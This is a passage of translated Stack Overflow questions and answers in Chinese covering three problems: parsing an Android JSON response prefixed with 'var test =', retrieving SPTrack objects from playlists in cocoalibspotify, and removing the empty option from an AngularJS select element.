                linkConnection.disconnect();
            }
        }
        Log.i("JSON Response----", ""+jsonString);
        return jsonString;
    }

    public static boolean isNetworkAvailable(Activity activity) {
        ConnectivityManager connectivity = (ConnectivityManager) activity
                .getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivity == null) {
            return false;
        } else {
            NetworkInfo[] info = connectivity.getAllNetworkInfo();
            if (info != null) {
                for (int i = 0; i < info.length; i++) {
                    if (info[i].getState() == NetworkInfo.State.CONNECTED) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

} 
```

请建议我一些解析这种 JSON 的解决方案。

**注意**- ：这个 Json 在 iPhone 中经过了很好的测试并且工作正常。

## 带有 JSON 响应的 Logcat 详细信息

```
 04-24 12:09:55.270: I/JSON Response----(2385): var test = [{"url" : "http://ads.mocean.mobi/2/redir/c5c61601-aca9-11e2-8400-a0369f167751/0/306865","text" : "Instagram","img" : "http://img.ads.mocean.mobi/img/50e/cbf/01b1baf/image_57x57.png","type": "image/png","track" : "http://ads.mocean.mobi/2/img/c5c61601-aca9-11e2-8400-a0369f167751"},{"url" : "http://ads.mocean.mobi/2/redir/c5c61602-aca9-11e2-8400-a0369f167751/0/306834","text" : "Drawsomething","img" : "http://img.ads.mocean.mobi/img/50e/cbe/2f70a73/image_57x57.png","type": "image/png","track" : "http://ads.mocean.mobi/2/img/c5c61602-aca9-11e2-8400-a0369f167751"},{"url" : "http://ads.mocean.mobi/2/redir/c5c61604-aca9-11e2-8400-a0369f167751/0/306518","text" : "Google Maps","img" : "http://img.ads.mocean.mobi/img/50e/c99/b95edc9/image_57x57.png","type": "image/png","track" : "http://ads.mocean.mobi/2/img/c5c61604-aca9-11e2-8400-a0369f167751"},{"url" : "http://ads.mocean.mobi/2/redir/c5c61605-aca9-11e2-8400-a0369f167751/0/306765","text" : "Find Friends","img" : "http://img.ads.mocean.mobi/img/50e/cb5/ce11bc6/image_57x57.png","type": "image/png","track" : "http://ads.mocean.mobi/2/img/c5c61605-aca9-11e2-8400-a0369f167751"},{"url" : "http://ads.mocean.mobi/2/redir/c5c63d10-aca9-11e2-8400-a0369f167751/0/306733","text" : "Flashlight","img" : "http://img.ads.mocean.mobi/img/50e/cb3/c34c71a/image_57x57.png","type": "image/png","track" : "http://ads.mocean.mobi/2/img/c5c63d10-aca9-11e2-8400-a0369f167751"}];
    04-24 12:09:55.290: W/System.err(2385): org.json.JSONException: Value var of type java.lang.String cannot be converted to JSONObject
    04-24 12:09:55.290: W/System.err(2385):     at org.json.JSON.typeMismatch(JSON.java:111)
    04-24 12:09:55.290: W/System.err(2385):     at org.json.JSONObject.<init>(JSONObject.java:158)
    04-24 12:09:55.301: W/System.err(2385):     at org.json.JSONObject.<init>(JSONObject.java:171)
    04-24 12:09:55.301: W/System.err(2385):     at com.impressol.appjiva.Home$MyTask.onPostExecute(Home.java:153)
    04-24 12:09:55.301: W/System.err(2385):     at com.impressol.appjiva.Home$MyTask.onPostExecute(Home.java:1)
    04-24 12:09:55.310: W/System.err(2385):     at android.os.AsyncTask.finish(AsyncTask.java:602)
    04-24 12:09:55.310: W/System.err(2385):     at android.os.AsyncTask.access$600(AsyncTask.java:156)
    04-24 12:09:55.320: W/System.err(2385):     at android.os.AsyncTask$InternalHandler.handleMessage(AsyncTask.java:615)
    04-24 12:09:55.330: W/System.err(2385):     at android.os.Handler.dispatchMessage(Handler.java:99)
    04-24 12:09:55.330: W/System.err(2385):     at android.os.Looper.loop(Looper.java:137)
    04-24 12:09:55.330: W/System.err(2385):     at android.app.ActivityThread.main(ActivityThread.java:4340)
    04-24 12:09:55.330: W/System.err(2385):     at java.lang.reflect.Method.invokeNative(Native Method)
    04-24 12:09:55.341: W/System.err(2385):     at java.lang.reflect.Method.invoke(Method.java:511)
    04-24 12:09:55.341: W/System.err(2385):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
    04-24 12:09:55.341: W/System.err(2385):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
    04-24 12:09:55.350: W/System.err(2385):     at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:57:11.620

从开头删除“var test”和“;” 从结果字符串的末尾。所以 JSON 看起来像以下..

```
[
    {
        "url": "http://ads.mocean.mobi/4/redir/a01a00e0-acab-11e2-afa2-a0369f06db33/0/306833",
        "text": "Amazon",
        "img": "http://img.ads.mocean.mobi/img/50e/cbb/ed021d2/image_57x57.png",
        "type": "image/png",
        "track": "http://ads.mocean.mobi/4/img/a01a00e0-acab-11e2-afa2-a0369f06db33"
    },
    {
        "url": "http://ads.mocean.mobi/4/redir/a01a00e2-acab-11e2-afa2-a0369f06db33/0/306864",
        "text": "Call of Duty",
        "img": "http://img.ads.mocean.mobi/img/50e/cbe/c0c7c88/image_57x57.png",
        "type": "image/png",
        "track": "http://ads.mocean.mobi/4/img/a01a00e2-acab-11e2-afa2-a0369f06db33"
    },
    {
        "url": "http://ads.mocean.mobi/4/redir/a01a27f0-acab-11e2-afa2-a0369f06db33/0/306868",
        "text": "GPS Drive",
        "img": "http://img.ads.mocean.mobi/img/50e/cc0/42a71e8/image_57x57.png",
        "type": "image/png",
        "track": "http://ads.mocean.mobi/4/img/a01a27f0-acab-11e2-afa2-a0369f06db33"
    },
    {
        "url": "http://ads.mocean.mobi/4/redir/a01a27f3-acab-11e2-afa2-a0369f06db33/0/306764",
        "text": "Twitter",
        "img": "http://img.ads.mocean.mobi/img/50e/cb5/942aaab/image_57x57.png",
        "type": "image/png",
        "track": "http://ads.mocean.mobi/4/img/a01a27f3-acab-11e2-afa2-a0369f06db33"
    },
    {
        "url": "http://ads.mocean.mobi/4/redir/a01a4f00-acab-11e2-afa2-a0369f06db33/0/306829",
        "text": "Temple run Brave",
        "img": "http://img.ads.mocean.mobi/img/50e/cba/c30b077/image_57x57.png",
        "type": "image/png",
        "track": "http://ads.mocean.mobi/4/img/a01a4f00-acab-11e2-afa2-a0369f06db33"
    }
] 
```

然后尝试更改以下行：

```
 JSONObject mainJson = new JSONObject(result);
                //JSONArray jsonArray = mainJson.getJSONArray(ARRAY_NAME);
                JSONArray jsonArray = mainJson.getJSONArray(APP_ARRAYNAME); 
```

和

```
 JSONArray jsonArray = new JSONArray(result); 
```

您始终可以使用[http://jsonlint.org/](http://jsonlint.org/)来检查 JSON 是否有效...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-24T07:17:03.633

从 JSON 响应`var test =`的开头和结尾删除。`;`

您的 JSON 解析 Android 代码应如下所示

```
try {
                    JSONArray jsonArray = new JSONArray(result);

                    for (int i = 0; i < jsonArray.length(); i++) {
                        JSONObject c = jsonArray.getJSONObject(i);
                          System.out.println(c.getString(APP_URL));
                          System.out.println(c.getString(APP_NAME));
                          System.out.println(c.getString(APP_IMAGE));
                          System.out.println(c.getString(IMAGE_TYPE));
                          System.out.println(c.getString(APP_TRACK));
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-24T06:50:54.817

我认为您需要从字符串解析中删除“var test =”...

# ios - 在 Cocoalibspotify 中检索播放列表的所有 SPTrack 的正确方法是什么？

> ID：16184996
> 
> 赞同：0
> 
> 时间：2013-04-24T06:36:46.380
> 
> 标签：ios, cocoalibspotify-2.0

我正在编写一个使用 cocoalibspotify 的 iPhone 应用程序。在我的一个视图中，我希望能够在表格视图中显示播放列表的所有 SPTrack。每个单元格应显示艺术家、专辑和曲目名称。我已经实现了一种异步检索播放列表内容的方法，但我还没有找到在后台线程上将 SPPlaylistItems“转换”为 SPTrack 对象的正确方法。结果，每次检索播放列表曲目时，我的 UI 都会滞后。当然，延迟非常小，但仍然很烦人。这是我检索播放列表内容的方法。

```
-(void)getPlaylistContentAsynchronouslyOfPlaylist:(NSString *)playlistName callback:(void (^)(NSArray *playlistTracks))block{
    NSLog(@"Getting content ansynchronously...");
    NSMutableArray *mutableArray = [[NSMutableArray alloc] init];
    SPPlaylist *playlist = [self getPlaylistWithName:playlistName];
    __block BOOL addedAllTracks = mutableArray.count == playlist.items.count;
    for (SPPlaylistItem *item in playlist.items){
        NSLog(@"----Checking Track with url %@", item.itemURL.absoluteString);
        NSURL *trackURL = [item.item spotifyURL];
        [[SPSession sharedSession]trackForURL:trackURL callback:^(SPTrack * spotifyTrack){
            if(spotifyTrack){
                //NSLog(@"---->>>Adding Track with url %@", item.itemURL.absoluteString);
                [mutableArray addObject:spotifyTrack];
            }

            if (mutableArray.count == playlist.items.count){
                //NSLog(@"!!!!!!!Added all songs!");
                addedAllTracks = YES;
            }
        }];
    }

    dispatch_async(self.backgroundQueue, ^{
        NSLog(@"Retrieving playlist content asynchronously...");
        while (!addedAllTracks){
            NSLog(@"<><><><>BG Queue is waiting....");
            [NSThread sleepForTimeInterval:0.25];
        }

        if (block){
            NSLog(@"Done retrieving playlist content asynchronously");
            NSLog(@"*******Passing %d tracks to the caller", mutableArray.count);
            dispatch_async(dispatch_get_main_queue(), ^() { block(mutableArray); });
        }
    });
} 
```

为了从 SPPlaylistItem 中检索 SPTrack，我使用了 SPSession 的 trackForURL 方法。在此方法的回调中，我将轨道添加到数组中。这就是问题所在：在主线程中添加这些对象会导致一些延迟。所以我的问题是：

1.  这是检索 SPPlaylist 中所有 SPTrack 对象的正确方法吗？如果不是，那么在后台线程上执行此操作以使我的 UI 不被阻塞的正确方法是什么？

感谢您提供任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T11:18:50.957

通过 URL 创建一个新的轨道是非常低效的——它`SPPlaylistItem`包含轨道本身。

将您通过 URL 获取曲目的部分替换为类似这样的内容，您应该没问题：

```
for (SPPlaylistItem *item in playlist.items) {
    if (item.itemClass == [SPTrack class])
        [mutableArray addObject:item.item];
} 
```

此外，值得注意的是，一次从播放列表中获取所有曲目是一个相当糟糕的主意 - 播放列表变得*非常*大，当你一次只有 20 个左右的屏幕上时保持 10,000 首曲目会让你跑很快就内存不足。

# angularjs - Angular - 从选择元素中删除空选项（？）

> ID：16184999
> 
> 赞同：1
> 
> 时间：2013-04-24T06:36:59.670
> 
> 标签：angularjs, angularjs-directive

我有一个用于列表并绑定到数组的选择元素。当数组为空时，将向选择元素添加一个选项元素 - 如下所示。这导致列表被突出显示，这是我不想要的

```
<select id="activeItemsSelect" ng-model="activeItems" ng-options="item.assessment_title for item in activeAssessments" size="5" class="span10" empty-select> 
```

我正在尝试删除选项元素，并尝试在指令空选择中这样做，尽管没有成功。如何删除此选项元素？

谢谢，提前任何和所有的答复。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-26T22:44:30.697

您可能想要手动添加一个空选项（角度应该抓住它），并`ng-switch`用于删除它

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-28T13:10:20.157

我正在使用这个支持`ng-size`属性表达式的指令：

```
.directive('ngSize', function () {
    return {
        restrict: 'A',
        link: function (scope, element, attrs) {
            if (element.prop("tagName") !== 'SELECT') {
                throw new Error('ngSize can only be applied to <select>-elements');
            }

            var exp = attrs.ngSize;
            scope.$watch(exp, function (newVal) {
                attrs.$set('size', newVal);
            });
        }
    }
}) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-07T08:06:13.153

初始化与选择一起使用的模型，因此选择小部件在显示时将具有默认值，而不是显示为空。在您的情况下，在您的控制器中执行以下操作。

```
$scope.activeItems = $scope.activeAssessments[0].assessment_title 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T07:04:58.237

您可能想要做的只是禁用选择。如果 ng-model 不作为选项存在，Angular 总是添加一个空选项。

```
<select id="activeItemsSelect" 
        class="span10"
        size="5" 
        ng-model="activeItems" 
        ng-disabled="activeItems.length == 0"
        ng-options="item.assessment_title for item in activeAssessments"
        ></select> 
```

**编辑**：根据文档更新的 Angular 版本：

> [https://docs.angularjs.org/api/ng/directive/ngOptions](https://docs.angularjs.org/api/ng/directive/ngOptions)：可以选择将值设置为空字符串的单个硬编码元素嵌套到元素中。然后，此元素将表示 null 或“未选择”选项。请参阅下面的示例进行演示。

```
<select id="activeItemsSelect" 
        class="span10"
        size="5" 
        ng-model="activeItems" 
        ng-disabled="activeItems.length == 0"
        ng-options="item.assessment_title for item in activeAssessments">
  <option value="">Select an Option</option>
</select> 
```

当数组为空时，您甚至可能希望将选项重新绑定到某些文本。